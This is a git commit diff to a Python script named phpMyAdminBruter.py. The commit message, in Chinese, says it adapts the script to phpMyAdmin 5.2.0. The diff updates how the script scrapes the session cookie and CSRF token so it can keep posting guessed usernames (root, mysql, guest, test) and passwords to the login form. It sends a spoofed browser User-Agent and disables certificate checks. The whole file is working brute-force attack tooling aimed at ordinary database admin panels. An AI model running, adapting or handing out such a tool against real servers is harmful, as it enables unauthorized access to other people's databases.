276f92c938e1a67feac0251d2bda3dff65dd072d
a <86544347+phpmac@users.noreply.github.com>
2025-06-10 00:51:46 +0800

    根据 phpmyadmin 5.2.0 版本做自动化适应
    根据 phpmyadmin 5.2.0 版本做自动化适应

--- phpMyAdminBruter.py
+++ phpMyAdminBruter.py
@@ -13,8 +13,18 @@ userList = ['root','mysql','guest','test']
 def getpassword(user, password):
     session = requests.session()
     res = session.get(Target,verify=False)
-    tmp_session = re.findall(r'phpMyAdmin=(.*?);', res.headers['Set-Cookie'])[2]#注意查看返回包cookie是否有多个phpMyAdmin
-    tmp_token = html.unescape(re.findall(r'name="token" value="(.*?)" /><input', res.text)[0])#不同版本正则有所区别
+    cookieName = 'phpMyAdmin_https' # ! 注意查看返回包cookie是否有多个phpMyAdmin
+    cookieMatch = re.findall(f'{cookieName}=(.*?);', res.headers['Set-Cookie'])
+    if (len(cookieMatch) == 0):
+        raise Exception("未找到 setCookie中的 phpMyAdmin_https,请查看网页源代码修改 cookieName 变量",res.headers['Set-Cookie'])
+    tmp_session = cookieMatch[0]
+    # print(res.text)
+    # 修正token正则,兼容不同HTML结构,原正则假设<input>后紧跟<input>,但实际HTML结构可能不同,需更通用匹配
+    tokenMatch = re.findall(r'<input[^>]*name="token"[^>]*value="(.*?)"', res.text)
+    if (len(tokenMatch) == 0):
+        raise Exception("未找到token表单的值,请查看网页源代码修改 tokenMatch 变量",res.text)
+    # print(tokenMatch)
+    tmp_token = html.unescape(tokenMatch[0])#不同版本正则有所区别
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
     post_data={"set_session":tmp_session,"pma_username":user,"pma_password":password,"server":"1","target":"index.php","token":tmp_token}
     res2 = session.post(url=Target,data=post_data,headers=headers,allow_redirects=False,verify=False)
